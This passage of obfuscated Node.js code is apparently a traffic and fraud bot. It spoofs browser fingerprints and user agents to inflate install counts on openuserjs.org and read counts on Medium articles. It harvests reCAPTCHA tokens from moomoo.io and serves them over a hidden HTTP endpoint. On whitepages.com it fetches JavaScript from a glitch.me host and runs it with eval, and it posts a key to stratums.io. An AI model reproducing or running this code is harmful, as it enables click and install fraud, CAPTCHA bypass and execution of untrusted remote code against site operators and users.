      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + V(0x5) + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + U(0x3, 'GC5J') + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + V(0x8) + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + W(0x10) + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + V(0x1) + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + V(0x6) + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + V(0x7) + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x137a * 0x1 + 0x42 + 0x34a * -0x6
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x3 * -0x89e + 0x1ca9 + 0x1 * -0x3683)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xb32 * -0x2 + 0xf35 + -0x2535), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x5 * -0x62f + 0x1f5b + -0xc), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0xa9f + 0x7b * 0x23 + 0xdb8 * -0x2;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x619 * -0x1 + -0x8ee + 0x2d5; w < getRandomInt(-0x1 * 0x1f8f + 0xb51 + -0x49 * -0x47, -0x1 * 0x20ab + 0x281 * -0xb + -0x11 * -0x38b); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0xf * 0x1231 + -0x82ff * -0x1 + -0x17840 * -0x1);
        }
      }();
    }, -0x74 + -0x195d + 0x1a35), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1c64 + -0x3 * -0x6ee + 0x79a;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x34b + -0x7 * 0x447 + 0x3 * 0xb14, -0x225a + 0x388 + 0x1f04)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x2f5 * 0x41 + -0x769 * -0x5 + -0x1 * 0x7012);
    }, 0x47b * -0x3 + 0x18a6 + -0xd5 * 0xd), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x17f7 + 0x2465 + 0xf17 * -0x4;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x62a * 0x2 + -0x44 * -0x44 + 0x5fc), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x2 * 0x136 + 0x1b1 * 0x6 + -0x649 * 0x2), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x24b7 * -0x46 + 0x54253 + 0x128357);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1de * 0x10 + 0x3 * -0x681 + 0x31c7);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const X = b,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0xd99 + -0x167 * 0x1b + 0x343e);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h[X(0x4, 'GS0L')]('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x153 * 0x23 + 0x3 * 0xe95 + 0x1115 * 0x2);
}

function a() {
  const bj = [
    'https://gr',
    'zti5zJLMnwy2oa',
    'https://op',
    'WPnYWObvl8ofW6JcNMNcTW',
    'WPpdVmoCW51R',
    'qw5KCM9PzcaXma',
    'ltHMy2vMzta2mq',
    'zs1MDw5Kyw1LBG',
    'oc4WlJaUmcbtyq',
    'CMCVC2nYAxb0CW',
    'W5zWW7JcTCoqgCknnwBcLW',
    'bNXFDcRcQYtcSq',
    'lxjLC3vTzq',
    'Dg9Y',
    'l3H0Agv4zgvYlW',
    '0.1462.54',
    'Kit/537.36',
    'W5eJWR94ca',
    'rrCaW4RdL3i0WRaneG',
    'WRndWRddPSo3BuRdK8ktWQG'
  ];
  a = function() {
    return bj;
  };
  return a();
}
doFlags['doOUJS'] && ((async () => {
  const Z = c,
    Y = d;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x72e + 0x1 * 0x8d9 + -0x1aa) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x2123 + -0x1b61 + -0x5c1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x527 * 0x7 + -0x149 + -0x18 * 0x173, D['indexOf']('\x20'));
        return B ? E['slice'](0x27d * 0xd + 0x574 + 0x1 * -0x25cd, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x95 * 0x3d + -0x5 * 0xa81 + 0x3814 * 0x1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x29a1 * -0x1 + 0x83 * -0x59 + 0x1f8f * 0x4),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      Y(0x2) + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + Z(0xe) + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + Z(0x9) + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + Y(0xf)
    ];
  f();
  for (let k = -0x25e4 + 0x1d25 + -0x8bf * -0x1; k < 0xf5 * -0x17 + -0xd * 0x113 + 0x21e * 0x11; k++)
    setTimeout(f, (-0x24f * 0x86 + -0x167ae + 0x70ed * 0x8) * k * getRandomInt(-0x161 * -0x5 + 0xc16 + -0xe * 0x15b, -0x68 * -0x27 + 0x344 * 0x1 + 0x1 * -0x1319));
  setInterval(() => {
    f();
    for (let l = 0x257 * -0x7 + -0x12 * -0x22b + -0x16a5; l < -0x45f * 0x5 + 0x623 * 0x6 + -0xef3; l++)
